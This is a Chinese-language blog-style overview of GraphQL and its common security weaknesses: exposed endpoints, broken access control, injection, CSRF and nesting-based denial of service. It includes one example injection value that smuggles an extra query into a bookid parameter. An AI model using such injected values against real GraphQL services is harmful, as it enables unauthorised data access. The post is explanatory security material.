简介

GraphQL 是一个用于 API 的查询语言，是一个使用基于类型系统来执行查询的服务端运行时（类型系统由你的数据定义）。GraphQL 并没有和任何特定数据库或者存储引擎绑定，而是依靠你现有的代码和数据支撑。

开始我觉得很疑惑,为什么还要专门为了查询API而专门设置一门语言?

其官方主打的招牌:请求你所要的数据 不多不少.

实战

在了解了部分基础语法后,我们来看看本次CVE-2020-9483中使用到的Graphql语句.

安全问题

既然是一个查询API的工具，回想了一下在日常中SRC中各种关于API漏洞，于是思考：在GraphQL中是否也同样存在呢?

通过Google发现，在GraphQL中也存在一定的安全问题的,我收集了了一部分,如下:

泄露了/graphql接口

作为GraphQL的查询入口,如果连入口都暴露在了公网,无疑就是向黑客打开了半扇门.并且大多数开放了此接口的网站都存在信息泄露.

身份认证与权限控制不当

身份认证类似于在SRC中遇到的API未授权访问,只要任何人能找到接口,那他就能够使用这个接口的功能.除此之外,由于需要查询的接口有权限访问机制,如果普通用户也能访问管理员的权限,那就…..

注入攻击

有语法就会有解析，有解析就会有结构和顺序，有结构和顺序就会有注入。

如果后台直接将用户的输入拼接到Graphql语句中,同样能达到意想不到的攻击效果.

例如:

假设用户输入的bookid参数为:book-1"){name}authorById("author-1"){firstName}#,由于#在Graphql中表示注释,很明显违背了后端处理的原本意图.

CSRF攻击

如果网站没有设置csrf-token以及对同源策略作一些限制,则可以利用GraphQL中的mutation修改数据.

DDos

GraphQL中也允许对象间包含组合的嵌套关系存在，如果不对嵌套深度进行限制，就会被攻击者利用进行拒绝服务攻击。

案例可以参考GraphQL安全指北 - FreeBuf网络安全行业门户.
